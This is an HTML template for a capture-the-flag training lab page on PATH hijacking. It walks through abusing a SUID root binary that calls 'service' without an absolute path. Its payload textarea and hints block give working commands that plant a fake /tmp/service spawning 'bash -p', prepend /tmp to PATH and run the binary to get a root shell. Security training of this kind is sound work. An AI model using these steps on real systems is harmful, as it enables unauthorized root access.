<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title><%= title %> - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
<body>
  <div class="matrix-bg"></div>
  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
  <div class="lab-container">
    <div class="lab-header"><h1><i class="fas fa-road"></i> PATH Hijacking</h1><div class="lab-info"><span class="lab-tag difficulty-medium">Medium</span></div></div>
    <div class="lab-section"><h2><i class="fas fa-crosshairs"></i> Objective</h2><p>A SUID binary calls another program without using an absolute path. Create a malicious version of the called program and manipulate PATH to escalate privileges.</p></div>
    <div class="lab-section"><h2><i class="fas fa-terminal"></i> Binary Analysis</h2>
      <div class="code-block">
        <h4>Target Binary: /usr/local/bin/status (SUID root)</h4>
        <pre>
$ strings /usr/local/bin/status
...
service apache2 status    ← calls "service" without absolute path!
...

$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
        </pre>
      </div>
      <div class="vulnerable-form" style="margin-top:1rem;">
        <div style="margin-bottom:1rem;">
          <label for="pathPayload">Malicious Script Content:</label>
          <textarea id="pathPayload" rows="3" style="width:100%;background:var(--bg-dark);color:var(--text);border:1px solid var(--primary-dim);padding:0.5rem;font-family:monospace;" placeholder="#!/bin/bash\n/bin/bash -p">#!/bin/bash
/bin/bash -p</textarea>
        </div>
        <div style="margin-bottom:1rem;">
          <label for="pathDir">PATH Prefix Directory:</label>
          <input type="text" id="pathDir" value="/tmp">
        </div>
        <button class="btn" onclick="exploitPath()"><i class="fas fa-play"></i> Execute Attack</button>
      </div>
      <div id="pathResults" class="result-box" style="margin-top:1rem;"></div>
      <div class="code-block">
        <h4><i class="fas fa-lightbulb"></i> Hints</h4>
        <pre>
# PATH hijacking steps:
# 1. Create malicious "service" in /tmp:
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service

# 2. Prepend /tmp to PATH:
export PATH=/tmp:$PATH

# 3. Run the SUID binary:
/usr/local/bin/status
# → Calls our malicious "service" as root!
        </pre>
      </div>
    </div>
    <div class="flag-submit"><h3><i class="fas fa-flag"></i> Capture The Flag</h3>
      <form onsubmit="submitFlagInline('privesc-path','flagInput_path','flagResult_path'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_path" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
      <div id="flagResult_path" style="display:none; margin-top:1rem;"></div>
    </div>
  </div>
  <script src="/js/main.js"></script>
  <script>
    async function exploitPath() {
      const payload = document.getElementById('pathPayload').value;
      const pathDir = document.getElementById('pathDir').value;
      const resultsDiv = document.getElementById('pathResults');
      resultsDiv.innerHTML = '<p style="color:var(--primary)"><i class="fas fa-spinner fa-spin"></i> Setting up PATH hijack...</p>';
      try {
        const res = await fetch('/api/labs/privesc/path', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({ payload, pathDir }) });
        const data = await res.json();
        resultsDiv.innerHTML = '<pre style="color:' + (data.success ? '#00ff00' : 'var(--text)') + ';white-space:pre-wrap;">' + (data.output || data.error) + '</pre>';
      } catch(e) { resultsDiv.innerHTML = '<p style="color:#ff4444">Error: ' + e.message + '</p>'; }
    }
  </script>
</body>
</html>
